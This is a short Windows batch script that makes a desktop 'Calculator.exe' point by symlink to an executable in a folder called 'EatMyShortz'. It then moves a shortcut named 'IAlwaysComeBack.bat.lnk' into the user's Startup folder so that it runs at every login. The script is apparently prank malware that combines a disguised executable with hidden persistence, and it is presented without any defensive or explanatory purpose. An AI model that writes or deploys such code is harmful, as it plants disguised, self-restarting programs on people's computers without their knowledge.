@echo off

cd "%homepath%\Desktop"
if exist Calculator.lnk (
	exit
) else (
	mklink "C:\Users\%username%\EatMyShortz\a.exe" "%homepath%\Desktop\Calculator.exe"
	mv "C:\Users\%username%\EatMyShortz\IAlwaysComeBack.bat.lnk" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
)